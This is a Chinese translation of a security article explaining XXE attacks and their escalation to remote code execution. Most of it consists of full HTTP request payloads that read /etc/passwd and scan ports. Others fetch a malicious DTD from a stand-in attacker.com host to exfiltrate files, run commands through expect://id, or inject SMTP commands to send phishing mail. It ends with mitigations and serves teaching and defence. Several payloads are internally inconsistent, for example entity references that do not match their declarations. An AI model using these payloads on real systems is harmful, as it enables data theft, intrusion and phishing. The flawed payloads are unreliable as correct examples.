# 从XML到RCE（远程代码执行）
##### 译文声明
本文是翻译文章，原文来源：gardienvirtuel.ca。具体内容和含义请以原文为准。

## 你的Web应用能否防止XXE攻击？
如果您的应用程序允许用户上传文件或提交POST请求，那么它很可能容易受到XXE（XML外部实体）攻击。尽管这种漏洞每天都在被大量检测到，但Gardien Virtuel在去年的几次Web应用程序渗透测试中已经成功利用了该漏洞。

## 什么是XXE？
XML eXternal Entity (XXE) 攻击被列入OWASP 2017年十大安全风险之一，并被定义为：
> “一种针对解析XML输入的应用程序的攻击。这是一种注入类型的攻击，如果正确利用，可能非常严重。当包含对外部实体引用的XML输入由配置不当的XML解析器处理时，该攻击就会发生。这种攻击可能导致服务器上的机密数据泄露、拒绝服务攻击、服务器端请求伪造、端口扫描以及其他系统影响。”

例如，在使用PHP时，需要将`libxml_disable_entity_loader`设置为`TRUE`以禁用外部实体。

## 漏洞利用介绍
通常情况下，XXE攻击者会创建一个注入XML文件的攻击载荷，执行该载荷时，可以读取服务器上的本地文件，访问内部网络并扫描内部端口。通过XXE，攻击者能够在本地计算机上读取敏感数据和系统文件，并在某些情况下将其升级为代码执行。

换句话说，XXE是一种绕过防火墙规则或授权检查，从本地主机访问各种服务的方法。

以下是一个简单的POST请求示例：

```http
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

<?xml version="1.0" encoding="UTF-8"?>
<note>
  <to>John, Doe</to>
  <from>I love XML</from>
  <heading>Computers</heading>
  <price>9.99</price>
  <date>2018-10-01</date>
  <description>XML is the best!</description>
</note>
```

上述代码将由服务器的XML处理器解析，并返回如下响应：
```json
{"Request Successful": "Added!"}
```

如果攻击者试图滥用XML代码解析，他们可能会编辑代码以包含恶意载荷：

```http
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<note>
  <to>John, Doe</to>
  <from>I love XML</from>
  <heading>Computers</heading>
  <price>9.99</price>
  <date>2018-10-01</date>
  <description>&xxe;</description>
</note>
```

这段代码会被执行并返回：
```json
{"error": "no results for description root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync...
```

## 盲带外XXE（Blind OOB XXE）
如上例所示，服务器将`/etc/passwd`文件的内容作为响应返回给我们的XXE。但在某些情况下，即使没有直接返回响应，服务器仍可能受到XXE攻击。盲带外XXE（OOB XXE）允许我们以不同方式利用此漏洞。

### 场景1 – 端口扫描
在第一个例子中，受攻击的服务器对我们的攻击返回了响应。我们可以使用文件URI方案指向`/etc/passwd`文件。当然，也可以使用HTTP URI方案并强制服务器向我们选择的目标和端口发送HTTP GET请求，将XXE转换为SSRF（服务器端请求伪造）。

下面的代码将尝试与端口8080通信，并根据响应时间和/或响应长度，攻击者将知道它是否已打开。

```http
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY % xxe SYSTEM "http://attacker.com:8080/">
  %xxe;
]>
<note>
  <to>John, Doe</to>
  <from>I love XML</from>
  <heading>Computers</heading>
  <price>9.99</price>
  <date>2018-10-01</date>
  <description>&xxe;</description>
</note>
```

### 场景2 – 通过DTD进行文件渗透
外部文档类型定义（DTD）文件可用于通过让易受远程攻击的服务器获取攻击者托管在VPS上的`.dtd`文件，并执行该文件中包含的恶意命令来触发OOB XXE。

以下请求已发送到应用程序以演示和测试此方法：

```http
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
  %dtd;
  <!ENTITY % all "<!ENTITY &#x25; file SYSTEM 'file:///etc/passwd'>">
  %all;
  <!ENTITY % param1 "&file;">
  %param1;
]>
<note>
  <to>John, Doe</to>
  <from>I love XML</from>
  <heading>Computers</heading>
  <price>9.99</price>
  <date>2018-10-01</date>
  <description>&xxe;</description>
</note>
```

上述代码一旦由被攻击的服务器执行，该服务器就会向我们的远程服务器发送请求，查找包含我们的载荷的DTD文件。结果是两个请求发送到我们的服务器，其中第二个请求是`/etc/passwd`文件的内容。

### 场景3 – 远程代码执行
这种情况很少发生，但还是会在一些情况下黑客能够通过XXE执行代码，这主要是由于内部应用程序配置/开发不当。如果我们很幸运遇到PHP `expect`模块被加载到易受攻击的系统或正在执行XML的内部应用程序上，我们可以执行如下命令：

```http
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY % xxe SYSTEM "expect://id">
  %xxe;
]>
<note>
  <to>John, Doe</to>
  <from>I love XML</from>
  <heading>Computers</heading>
  <price>9.99</price>
  <date>2018-10-01</date>
  <description>&xxe;</description>
</note>
```

响应包：
```json
{"error": "no results for description uid=0(root) gid=0(root)
groups=0(root)..."}
```

### 场景4 – 网络钓鱼
我们使用Java的XML解析器找到了一个易受攻击的端点。扫描内部端口后，我们发现侦听端口25的SMTP服务，Java支持在`sun.net.ftp.impl.FtpClient`中实现的FTP URI方案。

因此，我们可以指定用户名和密码，例如`ftp://user:password@hostport/test.txt`，FTP客户端将在连接中发送相应的USER命令。但如果将`%0D%0A`（CRLF）放在URL的user部分的任何位置，我们就可以终止USER命令并向FTP会话中注入一个新命令，允许我们向端口25发送任意SMTP命令：

```http
POST /vulnerable HTTP/1.1
Host: www.test.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://test.com/test.html
Content-Type: application/xml
Content-Length: 294
Cookie: mycookie=cookies;
Connection: close
Upgrade-Insecure-Requests: 1

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
  <!ENTITY % xxe SYSTEM "ftp://a%0D%0AEHLO%20a%0D%0AMAIL%20FROM:%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0ARCPT%20TO:%3Cvictim%40gmail.com%3E%0D%0ADATA%0D%0AFrom:%20support%40VULNERABLESYSTEM.com%0ATo:%20victim%40gmail.com%0ASubject:%20Reset%20your%20password%0A%0AWe%20need%20to%20confirm%20your%20identity.%20Confirm%20your%20password%20here:%20http://PHISHING_URL.com%0A.%0D%0AQUIT%0D%0A:PI:EMAIL:25">
  %xxe;
]>
<note>
  <to>John, Doe</to>
  <from>I love XML</from>
  <heading>Computers</heading>
  <price>9.99</price>
  <date>2018-10-01</date>
  <description>&xxe;</description>
</note>
```

这样攻击者就可以从受信任的源发送钓鱼电子邮件（例如：帐户重置链接），绕过垃圾邮件过滤器并降低服务的信任。

## 推荐几款有用的工具
谈到XXE，重要的是能够随时手动编辑Web请求的内容。BurpSuite是推荐的工具之一。在某些情况下，BurpSuite的扫描功能可以检测潜在的XXE漏洞，但建议手动利用。如果你设法利用存在XXE漏洞的系统，BurpSuite的Intruder比较适合自动探测开放端口。通过查看响应时间/响应长度，就可以快速判断端口是否已打开。

RequestBin和HookBin等HTTP请求分析器可用于测试OOB XXE。 BurpSuite Pro’s Collaborator一般来说可以解决这个问题，但是一些安全研究人员更喜欢使用他们自己的VPS。

## 漏洞应对措施
绝不相信最终用户。 在本文中，主要问题在于XML解析器处理用户发送的不受信任的数据。大多数XML解析器默认易受到XML外部实体攻击。因此，最佳解决方案是将XML处理器配置为使用本地静态DTD，并在部署应用程序之前禁用XML文档中包含的任何声明的DTD。

## 参考
1. [参考文献1]
2. [参考文献2]
3. [参考文献3]
4. [参考文献4]

## XXE相关知识
1. [相关知识1]
2. [相关知识2]
3. [相关知识3]

审核人：yiwang 编辑：边边